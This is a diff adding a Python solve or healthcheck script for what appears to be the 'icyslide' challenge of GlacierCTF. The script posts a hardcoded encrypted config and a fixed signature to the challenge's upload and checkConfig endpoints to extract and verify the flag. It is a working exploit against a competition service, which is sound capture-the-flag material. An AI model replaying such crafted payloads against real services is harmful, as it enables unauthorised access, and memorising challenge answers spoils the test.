@@ -1,0 +1,54 @@
+#!/usr/bin/env -S python3 -u
+# -*- coding: utf-8 -*-
+import os
+import requests
+import base64
+
+protocol = os.environ.get("PROT", "http")
+host = os.environ.get("HOST", "localhost")
+port = int(os.environ.get("PORT", "1337"))
+url = f"{protocol}://{host}:{port}"
+#url = "https://icyslide.web.snowyglacier.pro/"
+url = "https://icyslide.web.glacierctf.com/"
+print(url, flush=True)
+
+config = b'gAAAAABnNOzb5Q_8g75Fkv3kGVqGa9B6VX4LQu_ESTbj2Yj0dDEGtNvsPtH8XAzs6cHKyxKLT8AId69gCDuwoCT0DP8pIXbj4454U_2ri2dPlTvGl3mOAvMnaHguAgGZeXFqsGx7EbLCnpLThvaqjislbx8kzDtVb1VBS-LrxW0TvyGhpgYeoyZVJUJ6e4WZYzotRZJP2gdbPfkz-t0jsnRgoaSX6NBnKlHCLaIvFuxmRLVThSWEwlKKVR8jFbV0kc2ufgnFGqIPc9VxEVvnLOV5eKiqf85dMfPXT1IL9luyR3qmwb1iiSN30IV6HRSgAUcIBN1audLwEjBnX4-mmOGJmWDPWbQvWS8sgxUD9LFCkgBr7T771zEK3hWuSbfbaMcayPV8IxLaTolDq9AjPacd7gEGFncEUEKFtBCQvOXPRNTvNStZbh4j5ETdIlWXd48GlqTnyhTFTQrQW63M80I-GH_OD8B2-dSgujG1T9ikZVUkeo06jdBdYbjMgcqSxNPjb94xl7jeVi2dH7at38GXk1p5QZguVj-Y8nKgzoz0zS05s1xkjN40zRR0pjJo43rJOLwVa0aN9kUPl0TaQgpLfb-ap7ZeAExtiaaf6zQCwx8gxiHWT1hBMgk5g3xKgx3mbi_4hTCRiBhotai869gQu709QDjwJhPYP0QaN1YDLw2ndNjEwEOwwDl-x2FiYCADT1xqLezD0JtyAw3x6F7jhM2jy0-ZFdXKzY_IzFpoOM7ZRdP4W2Cmjg0vvZH4NO6YxGuHSPCoJKV63J0x9uKi6x3lSt4t_MywgxmZLLSoBIuQ93La365F9oqBDz0zusXbwF0dWC6t8FxPxbXeqMBtkbZLy9TiOQ=='
+signature = "OSZyUiimdEfoRTb7/Gk1lS+1iuo="
+test_string = b"This is a test string"
+
+header = {"Signature": signature}
+
+files_for_upload = {
+    "config": ("config.cfg", config, "application/octet-stream"),
+    "file": ("file.txt", test_string, "application/octet-stream")
+}
+upload_response = requests.post(f"{url}/upload", headers=header, files=files_for_upload)
+test_string_encrypted = base64.b64decode(upload_response.json()["processedData"])
+
+files_for_get_content = {
+    "config": ("config.cfg", config, "application/octet-stream"),
+    "file": ("file.txt", test_string_encrypted, "application/octet-stream")
+}
+get_content_response = requests.post(f"{url}/getContent", headers={"signature": signature}, files=files_for_get_content)
+test_string_decrypted = base64.b64decode(get_content_response.json()["processedData"])
+
+if test_string_decrypted != test_string:
+    print("[+] Test failed before even trying to get the flag", flush=True)
+    exit(255)
+
+config_file = {
+    "config": ("config.cfg", config, "application/octet-stream")
+}
+check_config_response = requests.post(f"{url}/checkConfig", headers={"signature": signature}, files=config_file)
+flag_decoded = base64.b64decode(check_config_response.json()["processedData"]).decode()
+# print(flag_decoded, flush=True)
+with open("flag.txt", "r") as f:
+    real_flag = f.read().strip()
+    if flag_decoded.strip() == real_flag:
+        print(f"\033[93m[+] Flag: {real_flag}\033[0m", flush=True)
+        exit(0)
+    else:
+        print("[+] Flag could not be found", flush=True)
+        exit(255)
+
+
